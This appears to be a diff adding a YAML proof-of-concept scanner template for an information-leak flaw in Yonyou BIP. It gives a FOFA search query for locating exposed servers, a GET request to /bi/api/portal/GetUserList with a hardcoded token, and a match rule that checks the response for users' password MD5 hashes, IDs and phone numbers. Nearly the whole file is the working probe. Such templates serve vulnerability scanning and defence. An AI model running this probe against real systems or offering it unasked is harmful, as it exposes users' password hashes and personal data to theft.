@@ -1,0 +1,18 @@
+id: poc-yaml-yongyou-bip-getuserlist-info-leak
+info:
+  name: 用友BIP /bi/api/Portal/GetUserList 信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: 用友BIP
+  fofa: body="用友BIP" && body="数据应用服务"
+requests:
+- method: GET
+  path: /bi/api/portal/GetUserList?token=e30fe47a-f33e-463e-bc4a-843957ca88dd_263720ea7e397482da220115cae828_1214162142339
+  headers:
+    Accept: application/json
+  expression: "status_code == 200 && \ncontains(find_json(body,\"0.PasswordMd5\"),\
+    \ \"\") &&\ncontains(find_json(body,\"0.Id\"), \"\") &&\ncontains(find_json(body,\"\
+    0.Telephone\"), \"\")\n"
+variables: {}
+transport: http
